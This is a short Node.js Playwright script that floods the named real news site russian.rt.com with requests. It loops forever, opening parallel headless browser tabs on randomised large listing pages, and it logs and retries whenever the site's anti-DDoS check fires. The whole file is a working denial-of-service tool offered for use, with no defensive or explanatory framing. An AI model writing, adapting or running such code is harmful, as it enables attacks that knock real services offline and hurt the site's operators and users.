const {chromium} = require('playwright-chromium');

const {getRandomInt, randomChoice} = require("./helper");

const meta = {
  'Article': ['sport', 'world', 'russia', 'ussr', 'business', 'science', 'nopolitics']
}


const run = async (browser) => {
  const page = await browser.newPage();

  const url = `https://russian.rt.com/listing/type.Article.category.${randomChoice(meta['Article'])}/prepare/all-news/${getRandomInt(500, 980)}/0`

  return new Promise(async resolve => {
    let fail = 0;
    page.on('response', async (response) => {
      if (response.url() === url) {
        if (response.status() === 200) {
          console.log('success');
          await page.waitForLoadState('networkidle');
          await page.waitForTimeout(500);
          await page.close();
          resolve()
        } else {
          console.log('ddos check');
          fail += 1
          await page.waitForNavigation();
          if (fail === 2) {
            console.log('fail');
            await page.close();
            resolve()
          }
        }
      }
    });
    await page.goto(url);
  })
}

(async () => {
  const browser = await chromium.launch(
    {
      // headless: false
    }
  );

  let tabs = 2;
  const args = process.argv.slice(2);
  if (args[0]) {
    tabs = Number(args[0])
  }

  while (true) {
    await Promise.all(Array(tabs).fill(1).map(v => run(browser)));
  }
})();
